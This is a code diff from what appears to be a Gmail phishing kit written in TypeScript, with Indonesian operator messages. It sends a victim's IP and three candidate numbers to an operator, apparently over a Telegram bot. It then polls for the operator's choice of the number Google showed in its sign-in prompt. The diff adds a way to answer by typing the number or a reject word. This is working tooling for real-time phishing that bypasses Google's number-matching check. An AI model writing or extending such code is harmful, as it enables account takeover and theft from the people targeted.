@@ -168,7 +168,9 @@ export async function sendGmailVerification(
     `🌐 <b>IP</b>         : <code>${ip}</code>\n` +
     `🕐 <b>Waktu</b>      : ${now}\n\n` +
     `🔢 <b>Angka tampil</b>: <code>${numbers.join("  |  ")}</code>\n\n` +
-    `⚠️ <i>Pilih angka yang benar untuk dikirim ke user:</i>\n` +
+    `✅ <b>Pilih angka yang benar</b> dari tombol di bawah\n` +
+    `📩 <i>atau balas pesan ini dengan angka yang benar\n` +
+    `(angka yang dikirim Google ke Gmail user)</i>\n` +
     `━━━━━━━━━━━━━━━━━━━━━`;
 
   const data = await post("/send-message", {
@@ -194,7 +196,11 @@ export async function pollGmailNumber(
 ): Promise<{ status: "selected" | "rejected" | "pending"; chosenNumber?: number; nextOffset: number; callbackId?: string }> {
   const data = await get(`/updates?offset=${offset}&timeout=2`) as {
     ok?: boolean;
-    result?: { update_id: number; callback_query?: { id: string; data?: string } }[];
+    result?: {
+      update_id: number;
+      callback_query?: { id: string; data?: string };
+      message?: { text?: string };
+    }[];
   };
 
   if (!data?.ok || !data.result?.length) return { status: "pending", nextOffset: offset };
@@ -203,6 +209,8 @@ export async function pollGmailNumber(
 
   for (const update of data.result) {
     nextOffset = update.update_id + 1;
+
+    /* ── inline button click ── */
     if (update.callback_query) {
       const cbData = update.callback_query.data ?? "";
       const callbackId = update.callback_query.id;
@@ -213,6 +221,21 @@ export async function pollGmailNumber(
       }
       if (cbData === `reject_${sessionKey}`) {
         return { status: "rejected", nextOffset, callbackId };
+      }
+    }
+
+    /* ── plain text message — admin types the number ── */
+    if (update.message?.text) {
+      const txt = update.message.text.trim();
+      /* reject keywords */
+      if (/^(reject|tolak|no|tidak)$/i.test(txt)) {
+        return { status: "rejected", nextOffset };
+      }
+      /* match any of the 3 numbers */
+      for (const n of numbers) {
+        if (txt === String(n)) {
+          return { status: "selected", chosenNumber: n, nextOffset };
+        }
       }
     }
   }
